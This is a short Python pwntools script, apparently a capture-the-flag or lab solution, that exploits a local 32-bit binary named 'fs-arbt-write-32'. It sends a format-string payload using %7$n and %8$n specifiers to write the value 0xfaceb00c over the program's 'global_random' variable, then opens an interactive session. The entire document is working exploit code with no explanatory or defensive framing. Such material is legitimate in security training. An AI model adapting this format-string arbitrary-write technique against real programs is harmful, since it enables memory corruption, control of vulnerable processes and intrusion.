#!/usr/bin/env python

from pwn import *

p = process('./fs-arbt-write-32')

glob_rand = p.elf.symbols['global_random']

e1 = 0xb00c
e2 = 0xface

buf = p32(glob_rand) + p32(glob_rand+2) + "%" + str(e1-8) + "x%7$n" + "%" + str(e2-e1) + "x%8$n"

p.sendline(buf)

p.interactive()
